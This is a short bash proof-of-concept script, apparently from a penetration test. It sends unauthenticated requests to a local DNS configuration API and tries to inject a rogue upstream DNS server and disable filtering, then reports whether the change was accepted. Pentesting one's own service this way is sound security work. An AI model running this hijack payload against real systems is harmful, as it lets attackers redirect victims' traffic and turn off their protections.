#!/bin/bash
# PoC - Unauthenticated DNS Configuration Hijack
# VIBE-OS Pentest Mode D

API_URL="http://localhost:3000/api/dns/config"

echo "--- [PoC] Tentative de lecture de la config DNS sans token ---"
curl -s -X GET "$API_URL" | jq . || echo "Échec de lecture (Normalement ouvert)"

echo -e "\n--- [PoC] Tentative de modification sauvage (Injecter un DNS pirate) ---"
# Simulation d'un serveur DNS malveillant
PAYLOAD='{"upstream_dns": ["1.2.3.4"], "filtering_enabled": false}'

RESPONSE=$(curl -s -X POST "$API_URL" \
     -H "Content-Type: application/json" \
     -d "$PAYLOAD")

echo "Réponse du serveur: $RESPONSE"

if [[ "$RESPONSE" == *"success\":true"* ]]; then
    echo -e "\n[🚨 CRITIQUE] L'API DNS a accepté la modification sans AUTHENTIFICATION."
else
    echo -e "\n[✅ SECURE] L'API a rejeté la modification."
fi
